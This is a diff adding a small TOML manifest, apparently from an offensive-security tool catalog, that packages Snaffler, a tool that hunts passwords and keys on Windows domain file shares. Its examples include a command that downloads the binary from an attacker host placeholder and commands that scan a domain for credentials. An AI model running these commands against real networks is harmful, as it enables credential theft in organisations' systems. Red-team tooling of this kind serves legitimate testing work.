@@ -1,0 +1,17 @@
+schema = 1
+kind = "upload"
+description = "Finds passwords and keys in the file shares of a Windows domain"
+tags = ["ad", "windows", "shares", "credentials", "enum"]
+upstream = "https://github.com/SnaffCon/Snaffler"
+licence = "GPL-3.0"
+arch = "x86_64"
+examples = [
+  "iwr http://{lhost}/Snaffler.exe -OutFile Snaffler.exe",
+  "Snaffler.exe -s -o snaffler.log",
+  "Snaffler.exe -s -d {domain} -c {ip} -o snaffler.log",
+]
+
+[[upload]]
+path = "files/Snaffler.exe"
+as = "Snaffler.exe"
+note = "Windows"
